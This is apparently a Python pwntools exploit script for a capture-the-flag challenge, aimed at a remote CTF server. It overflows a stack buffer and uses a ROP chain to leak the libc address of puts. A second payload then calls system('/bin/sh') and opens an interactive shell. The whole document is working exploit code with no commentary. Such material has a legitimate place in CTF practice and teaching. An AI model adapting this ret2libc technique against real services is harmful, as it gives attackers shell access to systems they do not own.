from pwn import *

# io = process("./pwn")
io = remote("node4.anna.nssctf.cn", 21992)
elf = ELF("./pwn")
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")

poprdi_addr = 0x400733
ret_addr = 0x4004c9

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = 0x4006ad

payload = b"a" * (0x20+0x8) + p64(poprdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.recvuntil(b"story!")
io.sendline(payload)
io.recvuntil(b"\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
print("puts address: ", hex(puts_addr))
base_libc = puts_addr - libc.sym['puts']
print("base libc address : ", hex(base_libc))
system_addr = base_libc + libc.sym['system']
print("system address:", hex(system_addr))
binsh_addr = base_libc + next(libc.search(b"/bin/sh\x00"))

payload = b"a" * (0x20+0x8) + p64(ret_addr) + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)
io.recvuntil(b"story!")
io.sendline(payload)

io.interactive()
